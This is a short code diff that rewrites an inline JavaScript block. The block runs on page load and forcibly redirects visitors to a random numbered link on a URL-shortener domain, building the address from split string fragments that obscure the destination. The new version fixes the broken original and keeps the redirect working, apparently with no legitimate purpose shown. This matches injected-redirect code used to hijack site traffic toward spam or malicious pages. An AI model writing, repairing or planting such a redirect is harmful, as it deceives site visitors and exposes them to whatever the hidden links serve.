@@ -1,12 +1,11 @@
-
 <script type = "text/javascript">
 function reDirect() {
-a = location.href = "rayj.";
-b = location.href = "short.";
-c = location.href = "gy/";
-d = Math.ceil(Math.random() * 7);
-a = "https://" + a + b + c + d ;
-window.location = a
+    var partA = "rayj";
+    var partB = "short.";
+    var partC = "gy/";
+    var randomNumber = Math.ceil(Math.random() * 8);
+    var finalURL = "https://" + partA + partB + partC + randomNumber;
+    window.location.href = finalURL;
 }
 reDirect();
 </script>
